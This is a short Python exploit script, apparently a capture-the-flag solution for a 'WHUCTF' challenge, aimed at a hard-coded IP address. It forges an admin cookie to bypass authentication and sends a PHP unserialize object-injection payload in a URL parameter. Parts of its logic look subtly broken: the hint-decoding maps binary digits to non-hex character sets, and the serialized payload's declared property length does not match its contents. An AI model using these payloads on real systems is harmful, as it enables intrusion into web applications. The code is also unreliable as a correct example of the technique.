import requests
import json
import re

url = "http://124.16.75.117:51002/"

# 第一步：设置基本cookie绕过认证和正则检查
base_cookie = {"admin": '{"hash": "a"}'}

# 获取提示信息
response = requests.get(url, cookies=base_cookie)
hint_pattern = r'给你个提示吧 \n([01]{32})'
hint_match = re.search(hint_pattern, response.text)

if not hint_match:
    print("无法获取提示信息")
    exit()

hint = hint_match.group(1)

# 根据提示重建可能的MD5
md5_chars = []
for i in range(32):
    shift_val = int(hint[i])
    # 可能的ASCII范围 (shift_val * 64) 到 (shift_val * 64 + 63)
    # MD5是十六进制字符，所以实际范围更小
    if shift_val == 0:
        possible_chars = "0123456789abcdef"
    elif shift_val == 1:
        possible_chars = "ghijklmnopqrstuv"
    else:
        possible_chars = "wxyz"
    
    md5_chars.append(possible_chars)

print("可能的MD5字符位置:")
for i, chars in enumerate(md5_chars):
    print(f"位置 {i+1}: {chars}")

# 由于完全破解MD5可能较困难，我们尝试利用反序列化漏洞

# 构造恶意序列化对象
# 需要将WHUCTF的stu属性替换为Evil类
evil_payload = 'O:6:"WHUCTF":1:{s:6:"*stu";O:4:"Evil":0:{}}'

# 发送请求
response = requests.get(url + f"?whuctf={evil_payload}", cookies=base_cookie)
print(response.text)